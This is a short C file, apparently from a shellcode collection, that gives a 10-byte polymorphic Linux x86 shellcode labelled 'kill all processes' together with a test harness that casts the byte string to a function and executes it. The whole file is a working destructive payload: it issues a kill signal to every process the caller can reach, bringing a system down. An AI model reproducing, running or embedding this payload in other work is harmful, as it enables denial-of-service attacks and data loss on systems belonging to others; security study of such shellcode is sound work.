// linux/x86 kill all processes
// Original Shellcode - 11 bytes: http://shell-storm.org/shellcode/files/shellcode-212.php
// Polymorphic Shellcode - 10 bytes
// Author: buffered4ever
// 15-03-2019

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x25\x58\x6a\xff\x5b\xb1\x09\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

